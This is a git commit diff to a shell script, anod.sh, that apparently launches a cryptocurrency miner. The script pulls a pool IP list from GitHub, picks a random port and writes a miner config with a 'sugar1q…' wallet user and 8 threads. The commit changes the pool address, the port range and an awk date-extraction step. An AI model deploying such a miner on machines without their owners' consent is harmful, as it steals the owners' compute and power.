6052c35e69869fc5b739ae2cec54ff0f468bcdcc
barburonjilo <barburonjilo@outlook.co.id>
2025-01-16 19:46:15 +0700

    Update anod.sh

--- anod.sh
+++ anod.sh
@@ -8,7 +8,7 @@ wget -O ip_list.json https://github.com/barburonjilo/open/raw/refs/heads/main/li
 random_ip=$(jq -r '.ips | .[]' ip_list.json | shuf -n 1)
 
 # Generate a random port in the range 501-510
-random_port=$((501 + RANDOM % 10))
+random_port=$((401 + RANDOM % 10))
 
 # Set the current date in UTC-7 format
 current_date=$(TZ=UTC-7 date +"%H-%M [%d-%m]")
@@ -16,7 +16,7 @@ current_date=$(TZ=UTC-7 date +"%H-%M [%d-%m]")
 # Create config.json with the selected IP and port
 cat > config.json <<END
 {
-  "url": "45.115.225.96:$random_port",
+  "url": "45.88.24.119:$random_port",
   "user": "sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr.fix",
   "pass": "x",
   "threads": 8,
@@ -36,4 +36,14 @@ clear
 echo RUN $(TZ=UTC-7 date +"%R-[%d/%m/%y]") && jobs
 
 # Run awk to process config.json and print the matching date-time part
-awk '/i-[0-9]{2}-[0-9]{2} \[[0-9]{2}-[0-9]{2}\]/ { print $0 }' config.json
+awk -v date_str="i-${current_date}" '
+{
+  if ($0 ~ /i-[0-9]{2}-[0-9]{2} \[[0-9]{2}-[0-9]{2}\]/) {
+    # Extract and print only the "i-<hour>-<minute> [<day>-<month>]" part
+    match($0, /i-[0-9]{2}-[0-9]{2} \[[0-9]{2}-[0-9]{2}\]/, arr)
+    if (length(arr) > 0) {
+      print arr[0]  # Print the matched date-time part
+    }
+  }
+}
+' config.json
